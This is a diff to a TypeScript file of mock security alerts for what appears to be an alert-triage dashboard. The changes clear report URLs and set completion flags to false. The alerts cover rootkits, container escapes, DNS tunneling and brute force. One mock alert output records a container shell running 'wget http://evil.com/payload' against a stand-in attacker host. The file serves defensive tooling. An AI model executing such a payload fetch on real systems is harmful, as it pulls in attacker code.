@@ -50,7 +50,7 @@ export const mockEvents: MockEvent[] = [
     timestamp: "2026-03-07T13:45:32Z",
     priority: "Critical",
     description: "Rootkit detection triggered on host db-prod-01",
-    reportUrl: "https://reports.example.com/r/002",
+    reportUrl: "",
     count: 1,
     askedAnalysis: true,
     finished: false,
@@ -101,7 +101,7 @@ export const mockEvents: MockEvent[] = [
     reportUrl: "",
     count: 1,
     askedAnalysis: false,
-    finished: true,
+    finished: false,
     rawPayload: {
       scan: {
         file: "/tmp/uploads/invoice.pdf",
@@ -124,7 +124,7 @@ export const mockEvents: MockEvent[] = [
     priority: "Critical",
     description:
       "Container escape attempt detected in pod kube-system/etcd-main",
-    reportUrl: "https://reports.example.com/r/005",
+    reportUrl: "",
     count: 2,
     askedAnalysis: true,
     finished: false,
@@ -153,7 +153,7 @@ export const mockEvents: MockEvent[] = [
     reportUrl: "",
     count: 47,
     askedAnalysis: false,
-    finished: true,
+    finished: false,
     rawPayload: {
       rule: {
         id: "5710",
@@ -201,7 +201,7 @@ export const mockEvents: MockEvent[] = [
     timestamp: "2026-03-07T07:40:11Z",
     priority: "Medium",
     description: "DNS tunneling activity detected from internal host 10.0.2.15",
-    reportUrl: "https://reports.example.com/r/008",
+    reportUrl: "",
     count: 8,
     askedAnalysis: false,
     finished: false,
@@ -231,7 +231,7 @@ export const mockEvents: MockEvent[] = [
     reportUrl: "",
     count: 1,
     askedAnalysis: false,
-    finished: true,
+    finished: false,
     rawPayload: {
       alert: {
         signature_id: 469,
@@ -339,7 +339,7 @@ export const mockEvents: MockEvent[] = [
     reportUrl: "",
     count: 3,
     askedAnalysis: false,
-    finished: true,
+    finished: false,
     rawPayload: {
       event_type: "tls",
       src_ip: "10.0.1.50",
@@ -365,7 +365,7 @@ export const mockEvents: MockEvent[] = [
     reportUrl: "",
     count: 1,
     askedAnalysis: false,
-    finished: true,
+    finished: false,
     rawPayload: {
       rule: {
         id: "5501",
@@ -387,7 +387,7 @@ export const mockEvents: MockEvent[] = [
     priority: "Critical",
     description:
       "Remote code execution attempt via deserialization on /api/webhook",
-    reportUrl: "https://reports.example.com/r/015",
+    reportUrl: "",
     count: 2,
     askedAnalysis: true,
     finished: false,
@@ -420,7 +420,7 @@ export const mockEvents: MockEvent[] = [
     reportUrl: "",
     count: 1,
     askedAnalysis: false,
-    finished: true,
+    finished: false,
     rawPayload: {
       scan: {
         file: "/tmp/uploads/resume.docx",
@@ -472,7 +472,7 @@ export const mockEvents: MockEvent[] = [
     reportUrl: "",
     count: 4,
     askedAnalysis: false,
-    finished: true,
+    finished: false,
     rawPayload: {
       ArtifactName: "python:3.12-slim",
       ArtifactType: "container_image",
@@ -531,7 +531,7 @@ export const mockEvents: MockEvent[] = [
     priority: "Medium",
     description:
       "Sensitive mount detected: /var/run/docker.sock mounted in container",
-    reportUrl: "https://reports.example.com/r/020",
+    reportUrl: "",
     count: 6,
     askedAnalysis: true,
     finished: false,
@@ -560,7 +560,7 @@ export const mockEvents: MockEvent[] = [
     reportUrl: "",
     count: 15,
     askedAnalysis: false,
-    finished: true,
+    finished: false,
     rawPayload: {
       rule: {
         level: 3,
@@ -642,7 +642,7 @@ export const mockEvents: MockEvent[] = [
     reportUrl: "",
     count: 1,
     askedAnalysis: false,
-    finished: true,
+    finished: false,
     rawPayload: {
       event_type: "alert",
       src_ip: "10.0.5.20",
@@ -667,7 +667,7 @@ export const mockEvents: MockEvent[] = [
     priority: "Medium",
     description:
       "HTTP traffic to known phishing domain login-secure-update.xyz",
-    reportUrl: "https://reports.example.com/r/025",
+    reportUrl: "",
     count: 3,
     askedAnalysis: false,
     finished: false,
@@ -726,7 +726,7 @@ export const mockEvents: MockEvent[] = [
     reportUrl: "",
     count: 9,
     askedAnalysis: false,
-    finished: true,
+    finished: false,
     rawPayload: {
       ArtifactName: "myapp:v2.1.0",
       ArtifactType: "container_image",
@@ -753,7 +753,7 @@ export const mockEvents: MockEvent[] = [
     timestamp: "2026-03-06T01:55:48Z",
     priority: "Medium",
     description: "Brute force attack detected on RDP service 10.0.1.5:3389",
-    reportUrl: "https://reports.example.com/r/028",
+    reportUrl: "",
     count: 230,
     askedAnalysis: true,
     finished: false,
@@ -784,7 +784,7 @@ export const mockEvents: MockEvent[] = [
     reportUrl: "",
     count: 2,
     askedAnalysis: false,
-    finished: true,
+    finished: false,
     rawPayload: {
       output:
         "Shell spawned in container (shell=/bin/bash args=-c wget http://evil.com/payload)",
